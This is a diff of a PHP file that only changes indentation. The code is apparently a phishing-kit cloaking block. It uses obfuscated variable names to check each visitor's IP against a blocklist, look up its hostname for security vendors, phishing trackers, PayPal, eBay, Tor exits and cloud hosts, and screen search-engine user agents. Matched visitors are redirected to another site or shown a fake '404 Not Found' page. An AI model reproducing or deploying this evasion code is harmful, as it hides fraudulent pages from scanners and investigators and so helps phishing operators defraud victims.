@@ -377,32 +377,34 @@
     "72.12.194.90",
     "216.162.210.13",
     "209.66.70.253",
-    );
-        if(in_array($c28dd9c,$c97e57ec)){
-            exit(header('Location: http://2m.ma'));
-            }else{
-                foreach($c97e57ec as $a4ade){
-                    if(preg_match('/'.$a4ade.'/',$c28dd9c)){
-                        header('Location: http://2m.ma');
-                        echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
-                        }
+);
+    
+    if(in_array($c28dd9c,$c97e57ec)){
+        exit(header('Location: http://2m.ma'));
+        }else {
+            foreach($c97e57ec as $a4ade){
+                if(preg_match('/'.$a4ade.'/',$c28dd9c)){
+                    header('Location: http://2m.ma');
+                    echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
                     }
                 }
-                $e5bd3f5f=gethostbyaddr($c28dd9c);
-                $f6650d6e=array("drweb","hostinger","scanurl","above","google","Dr.Web","facebook","softlayer","amazonaws","cyveillance","dreamhost","netpilot","calyxinstitute","tor-exit","phishtank","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler");
-                    
-                    foreach($f6650d6e as $e540ca){
-                        if(substr_count($e5bd3f5f,$e540ca)>0){
-                            header('Location: http://2m.ma');
-                            echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
-                        }
-                    }
-                       if(!empty($_SERVER['HTTP_USER_AGENT'])){
-                           $c3d1b=array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler");
-                           foreach($c3d1b as $cef6a){
-                               if(strpos($_SERVER['HTTP_USER_AGENT'],$cef6a)!==false){
-                                   exit(header('Location: http://2m.ma'));
-                                   }
-                                }
-                        }
+            }
+            $e5bd3f5f=gethostbyaddr($c28dd9c);
+            $f6650d6e=array("drweb","hostinger","scanurl","above","google","Dr.Web","facebook","softlayer","amazonaws","cyveillance","dreamhost","netpilot","calyxinstitute","tor-exit","phishtank","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler");
+                
+            foreach($f6650d6e as $e540ca){
+                if(substr_count($e5bd3f5f,$e540ca)>0){
+                    header('Location: http://2m.ma');
+                    echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
+                }
+            }
+
+if(!empty($_SERVER['HTTP_USER_AGENT'])){
+    $c3d1b=array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler");
+    foreach($c3d1b as $cef6a){
+        if(strpos($_SERVER['HTTP_USER_AGENT'],$cef6a)!==false){
+            exit(header('Location: http://2m.ma'));
+            }
+        }
+    }
 ?>
